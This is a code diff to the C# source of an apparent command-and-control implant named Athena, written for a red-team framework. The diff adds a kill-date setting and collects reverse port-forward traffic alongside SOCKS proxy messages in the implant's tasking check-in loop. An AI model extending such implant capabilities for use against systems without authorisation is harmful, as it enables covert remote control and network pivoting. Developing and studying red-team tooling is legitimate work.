@@ -46,6 +46,8 @@ namespace Athena
             this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
             int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
             this.sleep = sleep;
+            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
+            this.killDate = kd;
             int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
             this.jitter = jitter;
             this.uuid = "%UUID%";
@@ -71,17 +73,17 @@ namespace Athena
                 Task<List<string>> responseTask = TaskResponseHandler.GetTaskResponsesAsync();
                 Task<List<DelegateMessage>> delegateTask = DelegateResponseHandler.GetDelegateMessagesAsync();
                 Task<List<MythicDatagram>> socksTask = ProxyResponseHandler.GetSocksMessagesAsync();
-                await Task.WhenAll(responseTask, delegateTask, socksTask);
-
-                List<string> responses = await responseTask;
+                Task<List<MythicDatagram>> rpFwdTask = ProxyResponseHandler.GetRportFwdMessagesAsync();
+                await Task.WhenAll(responseTask, delegateTask, socksTask, rpFwdTask);
 
                 GetTasking gt = new GetTasking()
                 {
                     action = "get_tasking",
                     tasking_size = -1,
-                    delegates = await delegateTask,
-                    socks = await socksTask,
-                    responses = responses,
+                    delegates = delegateTask.Result,
+                    socks = socksTask.Result,
+                    responses = responseTask.Result,
+                    rpfwd = rpFwdTask.Result,
                 };
                 try
                 {
